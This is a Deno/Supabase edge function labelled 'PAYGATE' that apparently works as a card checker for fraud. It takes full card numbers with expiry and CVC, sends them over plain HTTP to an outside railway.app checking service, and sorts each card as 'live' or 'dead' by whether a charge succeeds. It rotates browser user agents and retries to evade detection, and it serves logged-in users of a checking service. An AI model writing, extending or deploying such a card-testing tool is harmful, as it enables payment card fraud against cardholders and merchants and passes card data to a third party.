import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
  "Access-Control-Max-Age": "86400",
};

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;

const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
];

const getRandomUserAgent = () => userAgents[Math.floor(Math.random() * userAgents.length)];

// Extract single key response message from API
const extractResponseMessage = (data: Record<string, unknown>): string => {
  // Priority: message > status > first meaningful field
  if (data?.message && typeof data.message === 'string') {
    return data.message;
  }
  if (data?.status && typeof data.status === 'string') {
    return data.status;
  }
  if (data?.error && typeof data.error === 'string') {
    return data.error;
  }
  if (data?.result && typeof data.result === 'string') {
    return data.result;
  }
  // Fallback to first string value found
  for (const key of Object.keys(data)) {
    if (typeof data[key] === 'string' && data[key]) {
      return data[key] as string;
    }
  }
  return 'No response message';
};

// Determine status from API response
const getStatusFromResponse = (data: Record<string, unknown>): "live" | "dead" | "unknown" => {
  const status = (data?.status as string)?.toUpperCase() || '';
  const message = (data?.message as string)?.toLowerCase() || '';
  const rawResponse = JSON.stringify(data).toLowerCase();
  
  // LIVE: Status is APPROVED/SUCCESS or similar, or "Successful transaction" in response
  if (status === 'APPROVED' || status === 'SUCCESS' || status === 'CHARGED' || status === 'LIVE') {
    return "live";
  }
  
  // Check for "Successful transaction" anywhere in response (case insensitive)
  if (rawResponse.includes('successful transaction') || rawResponse.includes('successfully charged')) {
    return "live";
  }
  
  // DEAD: Status is DECLINED or message indicates decline
  if (status === 'DECLINED' || status === 'DEAD' || status === 'FAILED') {
    return "dead";
  }
  
  // Check for 3D Secure/Verification/OTP/Redirect indicators - mark as DECLINED
  const declineIndicators = [
    'verification', '3d', 'otp', 'redirect', 
    'declined', 'failed', 'could not', 'transaction failed', 
    'try again', 'authentication required', 'secure', '3ds',
    'do not honor', 'not permitted', 'restricted', 'lost card',
    'stolen card', 'pickup card', 'fraud', 'security violation'
  ];
  
  for (const indicator of declineIndicators) {
    if (rawResponse.includes(indicator)) {
      console.log(`[PAYGATE] Found "${indicator}" in response - marking as DECLINED`);
      return "dead";
    }
  }
  
  if (message.includes('decline') || message.includes('declined') || 
      message.includes('insufficient') || message.includes('card was declined') ||
      message.includes('invalid') || message.includes('expired')) {
    return "dead";
  }
  
  if (message.includes('approved') || message.includes('success') || message.includes('charged')) {
    return "live";
  }
  
  // Everything else is UNKNOWN
  return "unknown";
};

// Perform API check with retry logic for UNKNOWN responses
const performCheck = async (cc: string, userAgent: string, attempt: number = 1): Promise<Record<string, unknown>> => {
  const maxRetries = 3;
  // API format: http://web-production-c8c87.up.railway.app/check?cc={cardnum}|{mm}|{yy}|{cvc}
  const apiUrl = `http://web-production-c8c87.up.railway.app/check?cc=${encodeURIComponent(cc)}`;
  
  console.log(`[PAYGATE] Attempt ${attempt}/${maxRetries} - Calling API:`, apiUrl);

  try {
    const response = await fetch(apiUrl, {
      method: 'GET',
      headers: {
        'User-Agent': userAgent,
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
      }
    });
    
    const rawText = await response.text();
    console.log(`[PAYGATE] Attempt ${attempt} - Raw API response:`, rawText);

    let data: Record<string, unknown>;
    try {
      data = JSON.parse(rawText);
    } catch {
      data = { raw: rawText, status: "ERROR", message: "Failed to parse response" };
    }

    console.log(`[PAYGATE] Attempt ${attempt} - Parsed response:`, data);

    // Add our computed status and response message for frontend
    const computedStatus = getStatusFromResponse(data);
    data.computedStatus = computedStatus;
    data.responseMessage = extractResponseMessage(data);

    // Check if response is UNKNOWN and should retry
    if (computedStatus === "unknown" && attempt < maxRetries) {
      console.log(`[PAYGATE] UNKNOWN response on attempt ${attempt}, retrying with new user agent...`);
      // Wait before retry (increasing delay)
      await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
      // Use a different user agent for retry
      const newUserAgent = getRandomUserAgent();
      return performCheck(cc, newUserAgent, attempt + 1);
    }

    return data;
  } catch (error) {
    console.error(`[PAYGATE] Attempt ${attempt} - Fetch error:`, error);
    
    if (attempt < maxRetries) {
      console.log(`[PAYGATE] Retrying after fetch error...`);
      await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
      const newUserAgent = getRandomUserAgent();
      return performCheck(cc, newUserAgent, attempt + 1);
    }
    
    return { 
      status: "ERROR", 
      message: error instanceof Error ? error.message : "Unknown fetch error",
      computedStatus: "unknown",
      responseMessage: error instanceof Error ? error.message : "Unknown error"
    };
  }
};

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    // REQUIRE AUTHENTICATION
    const authHeader = req.headers.get("Authorization");
    if (!authHeader?.startsWith("Bearer ")) {
      return new Response(
        JSON.stringify({ error: "Unauthorized" }),
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    // VERIFY USER TOKEN
    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
      global: { headers: { Authorization: authHeader } },
    });

    const { data: { user }, error: authError } = await supabase.auth.getUser();
    if (authError || !user) {
      return new Response(
        JSON.stringify({ error: "Invalid token" }),
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    // CHECK USER IS NOT BANNED
    const { data: profile } = await supabase
      .from("profiles")
      .select("is_banned")
      .eq("user_id", user.id)
      .single();

    if (profile?.is_banned) {
      return new Response(
        JSON.stringify({ error: "Account suspended" }),
        { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    const { cc } = await req.json();
    
    if (!cc) {
      return new Response(
        JSON.stringify({ error: 'Card data (cc) is required', computedStatus: 'unknown' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Validate card format: CardNumber|MM|YY|CVC - CVC is MANDATORY
    const cardParts = cc.split('|');
    if (cardParts.length < 4) {
      return new Response(
        JSON.stringify({ error: "Invalid card format. Required: CardNumber|MM|YY|CVC", computedStatus: 'unknown' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const [cardNumber, mm, yy, cvc] = cardParts;
    
    // Validate CVC is present and valid (3-4 digits)
    if (!cvc || cvc.length < 3 || cvc.length > 4 || !/^\d+$/.test(cvc)) {
      return new Response(
        JSON.stringify({ error: "CVC is mandatory and must be 3-4 digits", computedStatus: 'unknown' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const userAgent = getRandomUserAgent();
    console.log('[PAYGATE] Checking card for user:', user.id);
    console.log('[PAYGATE] Using User-Agent:', userAgent);

    // Perform check with automatic retry for UNKNOWN responses
    const data = await performCheck(cc, userAgent);

    return new Response(
      JSON.stringify(data),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error: unknown) {
    const errorMessage = error instanceof Error ? error.message : 'Unknown error';
    console.error('[PAYGATE] Error:', errorMessage);
    
    return new Response(
      JSON.stringify({ error: errorMessage, status: "ERROR", computedStatus: "unknown" }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});